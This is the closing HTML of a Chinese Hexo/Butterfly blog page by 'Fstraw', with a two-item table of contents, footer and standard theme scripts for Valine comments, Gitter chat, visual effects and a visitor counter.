fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Part1-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">Part1 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part2-%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">Part2 技术研究过程</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/backup.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Fstraw</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://ccc-f.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/fancybox.umd.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="/js/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>var requestSetting = function (from,set) {
+    var from = from
+    var setting = set.split(',').filter(function(item){
+    return from.indexOf(item) > -1
+    });
+    setting = setting.length == 0 ? from :setting;
+    return setting
+}
+
+var guestInfo = requestSetting(['nick','mail','link'],'')
+var requiredFields = requestSetting(['nick','mail'],'nick,mail')
+function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      master:'7f26fd285f1e832baef86f5bcaadd06a',
+      pageSize:'10',
+      lang:'zh-CN',
+      placeholder:'建议使用QQ邮箱,评论头像采用QQ头像',
+      recordIP:'true',
+      enableQQ:'true',
+      requiredFields: requiredFields,
+      appId: '9xmgN7UpSgxN7k2zu16HHcl6-gzGzoHsz',
+      appKey: '6t7uQFgue7owtGg4R7ieIYWu',
+      avatar: 'monsterid',
+      serverURLs: 'https://9xmgn7up.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('/js/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="/js/fireworks.min.js"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script>((window.gitter = {}).chat = {}).options = {
+  disableDefaultChat: true,
+};
+document.addEventListener('gitter-sidecar-ready', (e) => {
+  const GitterChat = e.detail.Chat
+  let chat
+
+  function initGitter () {
+    chat = new GitterChat({
+      room: 'blogroom/test',
+      activationElement: '#chat_btn'
+    });
+  }
+
+  initGitter()
+
+  if (false) {
+    document.addEventListener('pjax:complete', () => {
+      chat.destroy()
+      initGitter()
+    })
+  }
+
+})</script><script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async="async" defer="defer"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
